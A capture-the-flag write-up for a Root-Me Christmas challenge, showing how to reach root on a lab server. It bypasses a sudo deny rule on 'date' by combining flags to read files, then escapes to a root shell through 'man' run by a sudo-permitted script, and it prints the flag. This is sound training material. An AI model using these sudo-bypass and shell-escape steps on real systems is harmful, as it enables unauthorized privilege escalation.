# Day 22 - The date is near

## Challenge
The date is approaching ... Santa provides you with a server to connect to via SSH.

It seems he's left a flag in /root/. Will you be able to catch it?

The username is sshuser and the password is password.

>    - Author: Elweth
>    - https://deploy.xmas.root-me.org/

## Note
Second part only solved after the competition.

## Solution
As `sshuser`, we have access to following `sudo rules`:

```console
$ sudo -l
Matching Defaults entries for sshuser on the-date-is-near:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, !requiretty

User sshuser may run the following commands on the-date-is-near:
    (ALL) NOPASSWD: /bin/date *, !/bin/date *-f*, !/bin/date *--file*
    (ALL) NOPASSWD: /usr/bin/dev.sh
```

Looking at `GTFOBins`, `date` allows for a `file read` using option `-f` of `--file` (see https://gtfobins.github.io/gtfobins/date/#file-read).

Unfortunately, those are prevented using `!/bin/date *-f*` and `!/bin/date *--file*`.

Still, we can bypass it by using another argument, like `-u`, which sets UTC time format. With this, we can now read files, like for instance the interesting `/usr/bin/dev.sh`:

```console
$ sudo /bin/date -uf /usr/bin/dev.sh
/bin/date: invalid date '#!/bin/bash'
Mon Dec 30 00:00:00 UTC 2024
/bin/date: invalid date '# Check if the --debugmyscript argument is present'
/bin/date: invalid date 'if [[ "$1" != "--debugmyscript" ]]; then'
/bin/date: invalid date '    exit 0  # Exit silently if the --debugmyscript argument is not provided'
/bin/date: invalid date 'fi'
Mon Dec 30 00:00:00 UTC 2024
/bin/date: invalid date '# Remove --debugmyscript from the argument list'
/bin/date: invalid date 'shift'
Mon Dec 30 00:00:00 UTC 2024
/bin/date: invalid date 'echo "Welcome to the dev.sh script!"'
Mon Dec 30 00:00:00 UTC 2024
/bin/date: invalid date '# Function to display help'
/bin/date: invalid date 'function show_help {'
/bin/date: invalid date '    echo "Usage: $0 [options]"'
(...)
```

Here's the complete script:

```bash
#!/bin/bash

# Check if the --debugmyscript argument is present
if [[ "$1" != "--debugmyscript" ]]; then
    exit 0  # Exit silently if the --debugmyscript argument is not provided
fi

# Remove --debugmyscript from the argument list
shift

echo "Welcome to the dev.sh script!"

# Function to display help
function show_help {
    echo "Usage: $0 [options]"
    echo
    echo "Options:"
    echo "  -l            List all running processes."
    echo "  -d            Show available disk space."
    echo "  -m            Show the manual for the printf command."
    echo "  -h            Show this help message."
}

# Check if no arguments are provided after --debugmyscript
if [ $# -eq 0 ]; then
    echo "Error: No arguments provided."
    show_help
    exit 1
fi

# Process arguments
while getopts "ldmh" opt; do
    case $opt in
        l)
            echo "Listing running processes:"
            ps aux
            ;;
        d)
            echo "Displaying available disk space:"
            df -h
            ;;
        m)
            echo "Displaying the manual for printf:"
            man printf
            ;;
        h)
            show_help
            ;;
        *)
            echo "Invalid option."
            show_help
            exit 1
            ;;
    esac
done
```

Providing we input argument `--debugmyscript`, we can then list running processes with option `-l`, display available disk space with option `-d` or display the manual for printf with option `-m`.

I was stuck there during the competition and only solved it afterwards. The trick is to abuse the `man printf`, which can be used to break out from restricted environments by spawning an interactive system shell. See `GTFOBins` again: https://gtfobins.github.io/gtfobins/man/#shell

```console
$ sudo /usr/bin/dev.sh --debugmyscript -m
Welcome to the dev.sh script!
Displaying the manual for printf:
man: can't set the locale; make sure $LC_* and $LANG are correct
PRINTF(1)                                    User Commands                                   PRINTF(1)

NAME
       printf - format and print data
(...)
!bash
root@the-date-is-near:/home/sshuser#
```

Since we ran the `man printf` as `sudo`, we have now a `root shell` and we can read the flag under /root:

```console
root@the-date-is-near:/home/sshuser# cd /root
root@the-date-is-near:~# ls -al
total 20
drwx------ 1 root root 4096 Dec 22 10:19 .
drwxr-xr-x 1 root root 4096 Dec 30 11:09 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root   27 Dec 22 10:19 flag-1a0a6a36ca0a3953b997ddaeb722cb31e9e421b038f6a67ef55593f21dcf92b1.txt
root@the-date-is-near:~# cat flag-1a0a6a36ca0a3953b997ddaeb722cb31e9e421b038f6a67ef55593f21dcf92b1.txt
RM{S4NTA_IS_N0T_4DMIN_SYS}
```

## Flag
> RM{S4NTA_IS_N0T_4DMIN_SYS}
